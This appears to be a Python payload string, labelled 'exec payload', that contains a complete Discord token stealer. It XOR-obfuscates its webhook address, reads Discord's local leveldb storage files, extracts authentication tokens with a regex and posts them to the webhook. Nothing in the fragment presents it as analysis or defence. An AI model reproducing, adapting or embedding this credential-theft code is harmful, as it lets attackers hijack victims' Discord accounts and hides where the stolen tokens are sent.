"""# exec payload: import os, re, requests
_d = lambda s: ''.join(chr(ord(c)^37) for c in s)
WEBHOOK = _d("MQQUV\x1f

ALVFJWA\x0bFJH
DUL
R@GMJJNV
\x14\x14\x17\x17\x16\x16\x11\x11\x10\x10
uidf`mjia`wzr`gmjjnzqjn`k")
def _grab():
    base = os.path.join(os.getenv('APPDATA') or '', 'discord', 'Local Storage', 'leveldb')
    found = []
    if os.path.isdir(base):
        for f in os.listdir(base):
            if not f.endswith(('.log', '.ldb')):
                continue
            try:
                data = open(os.path.join(base, f), errors='ignore').read()
                found += re.findall(r'[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}', data)
            except Exception:
                pass
    return list(set(found))
toks = _grab()
if toks:
    requests.post(WEBHOOK, json={"content": "\\n".join(toks)})"""